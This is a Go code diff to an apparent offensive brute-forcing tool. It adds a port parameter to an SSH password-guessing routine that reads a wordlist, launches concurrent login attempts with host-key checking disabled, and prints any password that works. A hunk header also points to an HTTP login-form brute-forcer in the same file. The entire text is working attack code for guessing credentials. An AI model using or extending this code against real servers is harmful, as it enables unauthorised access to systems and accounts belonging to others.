@@ -114,8 +114,7 @@ func Brute_HTTP_LOGIN_FORM(url, username, userfield, passfield, wordlist, error_
 }
 
 // SSH brute forcing
-
-func Auth_SSH_(username, password, host string, hw_chan chan bool) {
+func Auth_SSH_(username, password, host, port string, hw_chan chan bool) {
 	sshConfig := &ssh.ClientConfig{
 		User: username,
 		Auth: []ssh.AuthMethod{
@@ -123,18 +122,19 @@ func Auth_SSH_(username, password, host string, hw_chan chan bool) {
 		},
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 	}
-	_, e := ssh.Dial("tcp", host, sshConfig)
+	_, e := ssh.Dial("tcp", net.JoinHostPort(host, port), sshConfig)
 	warn.Warning_advanced("<RR6> Call from - Errors module: Could not make a connection or dial up to the ssh server ==> ", v.REDHB, 1, false, false, false, e, 1, 255, "")
+	fmt.Println(e)
 	if e == nil {
 		fmt.Println("<RR6> SSH Module: Made connection to host | password for host -> ", host, " is -> ", password)
 	} else {
 		try++
-		fmt.Println("<RR6> SSH Module: Could not make a connection or authentication to the host, trying new credential try <<< ", try, " >>> ")
+		fmt.Println("<RR6> SSH Module: Auth failed | ", try, " | ")
 	}
 	hw_chan <- true
 }
 
-func Brute_SSH_(username, wordlist, host string) {
+func Brute_SSH_(username, wordlist, host, port string) {
 	content, e := os.Open(wordlist)
 	warn.Warning_advanced("<RR6> Call from - Errors module: Could not open wordlist ==> ", v.REDHB, 1, false, false, false, e, 1, 255, "")
 	defer content.Close()
@@ -142,7 +142,7 @@ func Brute_SSH_(username, wordlist, host string) {
 	for scanner.Scan() {
 		thread_count += 1
 		pass := scanner.Text()
-		go Auth_SSH_(username, pass, host, hardware_chan)
+		go Auth_SSH_(username, pass, host, port, hardware_chan)
 		if thread_count >= max_threads {
 			<-hardware_chan
 			thread_count -= 1
